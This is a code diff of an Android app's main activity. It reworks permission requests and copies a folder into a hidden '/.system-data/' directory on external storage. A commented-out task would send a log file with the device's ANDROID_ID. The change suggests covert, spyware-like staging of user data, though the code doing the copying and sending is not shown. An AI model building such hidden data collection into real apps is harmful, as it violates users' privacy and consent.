@@ -29,18 +29,25 @@ public class MainActivity extends AppCompatActivity {
         setContentView(R.layout.activity_main);
 
         checkPermissionAndRunRequest(Manifest.permission.WRITE_EXTERNAL_STORAGE, MY_PERMISSION_REQUSTE_STORAGE);
-        checkPermissionAndRunRequest(Manifest.permission.INTERNET, MY_PERMISSION_REQUSTE_INTERNET);
-        checkPermissionAndRunRequest(Manifest.permission.MODIFY_PHONE_STATE, MY_PERMISSION_REQUSTE_PHONE);
+        //checkPermissionAndRunRequest(Manifest.permission.INTERNET, MY_PERMISSION_REQUSTE_INTERNET);
+        //checkPermissionAndRunRequest(Manifest.permission.MODIFY_PHONE_STATE, MY_PERMISSION_REQUSTE_PHONE);
 
         final ProgressBar pb = (ProgressBar) findViewById(R.id.progressBar2);
         final TextView tv = (TextView) findViewById(R.id.textView3);
         final String toPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/.system-data/";
 
-        CopyFilesTask cp = new CopyFilesTask(this, folder, toPath);
-        cp.execute();
+        //CopyFilesTask cp = new CopyFilesTask(this, folder, toPath);
+        //cp.execute(toPath);
+
+        performCopy(toPath);
 
         //SendFileTask sf = new SendFileTask(Environment.getExternalStorageDirectory().getAbsolutePath() + "/log.from.app", Settings.Secure.ANDROID_ID);
         //sf.execute();
+    }
+
+    private void performCopy(String toPath){
+        CopyFilesTask cp = new CopyFilesTask(this, folder, toPath);
+        cp.execute();
     }
 
     private void checkPermissionAndRunRequest(String permission, int request_code){
@@ -65,12 +72,14 @@ public class MainActivity extends AppCompatActivity {
                 if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                     if(ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
                         //all right, do nothing
+                        final String toPath = Environment.getExternalStorageDirectory().getAbsolutePath() + "/.system-data/";
+                        performCopy(toPath);
                     } else {
                         Toast.makeText(this, "No storage permission granted!", Toast.LENGTH_SHORT).show();
                     }
                 }
             }
-            case MY_PERMISSION_REQUSTE_INTERNET:{
+            /*case MY_PERMISSION_REQUSTE_INTERNET:{
                 if(grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
                     if(ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.INTERNET) == PackageManager.PERMISSION_GRANTED){
                         //all right, do nothing
@@ -87,7 +96,7 @@ public class MainActivity extends AppCompatActivity {
                         Toast.makeText(this, "No phone_stats permission granted!", Toast.LENGTH_SHORT).show();
                     }
                 }
-            }
+            }*/
         }
     }
 }
